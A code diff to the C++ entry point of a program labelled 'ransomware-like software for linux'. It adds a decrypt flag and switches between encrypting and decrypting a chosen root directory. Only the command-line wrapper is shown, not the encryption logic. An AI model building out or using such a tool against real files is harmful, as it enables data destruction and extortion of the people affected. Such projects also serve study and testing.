@@ -12,6 +12,7 @@ int main(int const argc, char const *const argv[])
     auto options = cxxopts::Options("ransomware", "Custom ransomware-like software for linux");
     options.add_options()
         ("r,root", "root directory for encryption", cxxopts::value<std::string>())
+        ("d,decrypt", "decrypt previously encrypted directory")
         ("h,help", "print usage");
     auto result = options.parse(argc, argv);
 
@@ -24,8 +25,13 @@ int main(int const argc, char const *const argv[])
     std::cout << fmt::format("Root directory for encryption: {}\n", rootPath) << std::flush;
 
     try {
-        auto encryptor = Encryptor(rootPath);
-        encryptor.Encrypt();
+        bool decrypt = result.count("decrypt");
+        auto encryptor = Encryptor(rootPath, decrypt);
+        if (decrypt) {
+            encryptor.Decrypt();
+        } else {
+            encryptor.Encrypt();
+        }
     } catch (std::exception &e) {
         std::cerr << fmt::format("Encryption failed with an exception: {}\n", e.what());
     }
